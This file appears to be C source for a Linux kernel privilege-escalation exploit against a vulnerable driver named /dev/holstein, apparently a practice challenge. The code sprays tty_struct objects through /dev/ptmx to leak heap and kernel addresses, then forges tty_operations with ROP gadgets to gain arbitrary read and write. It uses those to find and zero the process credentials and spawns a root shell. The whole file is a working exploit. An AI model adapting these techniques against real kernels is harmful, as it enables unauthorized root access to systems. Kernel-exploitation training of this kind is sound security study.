#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <string.h>
#include <stddef.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
#define pause() getchar()
#define dev_file "/dev/holstein"
int global_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    if(global_fd < 0)
        errExit("Can't open dev file");
    log_info("Opened dev file");
}
char buf[0x800+0x100];
void read_dev(){
    read(global_fd,buf,sizeof(buf));
}
void write_dev(){
    write(global_fd,buf,sizeof(buf));
}
int spary[50];
int64_t g_buf, _text,_heap_addr;
int64_t _heap_reader;
int64_t cred_addr,cred;
int victim_fd;
void AAW_32(int fd,int32_t value,int32_t* target){ // arbitrary address write 
    ioctl(fd,value,target);
}
int32_t AAR_32(int fd,int32_t* target){
    return ioctl(fd,0,target);
}
void AAR_32_find(int fd){ // arbitrary address read 
    _heap_reader = ioctl(fd,0,_heap_addr);
    log_info("Searching...");
    if (_heap_reader != -1)
        while(cred_addr == 0){
            _heap_reader = ioctl(fd,0,_heap_addr);
            //log_info("Searching... 0x%lx: 0x%lx",_heap_addr,_heap_reader);
            if(_heap_reader == 0x48484848){
                log_info("Found at 0x%lx",_heap_addr);
                cred_addr = _heap_addr-0x10;
            }
            _heap_addr+=8;
        }
        victim_fd = fd;
}
int main(int argc,char** argv,char **envp){
    for(size_t i=0;i<25;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    open_dev();
    for(size_t i=25;i<50;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    read_dev();
    int64_t* leak = (int64_t *)(buf+0x400);
    if( *leak == 0x100005401){
        log_info("struct tty_struct at offset 0x%lx",0x400UL);
        log_info("Leak heap: 0x%lx",leak[7]);
        g_buf = leak[7]-0x438;
        log_info("-> g_buf = 0x%lx",g_buf);
        log_info("Leak kernel: 0x%lx",leak[3]);
        log_info("-> text base: 0x%lx",leak[3]-0xc38880);
        _text = leak[3]-0xc38880;
    }
    else
        errExit("0x%lx",*(int64_t *)(buf+0x400));
    struct tty_operations fake_tty = {0};
    _heap_addr = g_buf - 0x1ff000;
    fake_tty.ioctl = _text+0x3a5f29; // mov rax, qword ptr [rdx] ; ret
    memcpy(buf,&fake_tty,sizeof(fake_tty));
    leak[3] = g_buf;
    if (prctl(PR_SET_NAME, "HHHHGGGGLLLLKKKK") != 0)
        errExit("prctl");
    write_dev();
    for(size_t i=0;i<50;i++){
        if(cred_addr)
            break;
        AAR_32_find(spary[i]);
        _heap_addr+=8;
    }
    cred |= AAR_32(victim_fd,(int32_t *)cred_addr);
    int64_t _ = AAR_32(victim_fd,(int32_t *)(cred_addr+4));
    cred |= (_ << 32);
    log_info("cred = 0x%lx",cred);
    fake_tty.ioctl = _text+0xb8375; // mov qword ptr [rdx], rsi ; ret
    memcpy(buf,&fake_tty,sizeof(fake_tty));
    write_dev();
    for(size_t i=1;i<9;i++){
        AAW_32(victim_fd,0,(int32_t *)(cred+4*i));
    }
    system("/bin/sh");
};
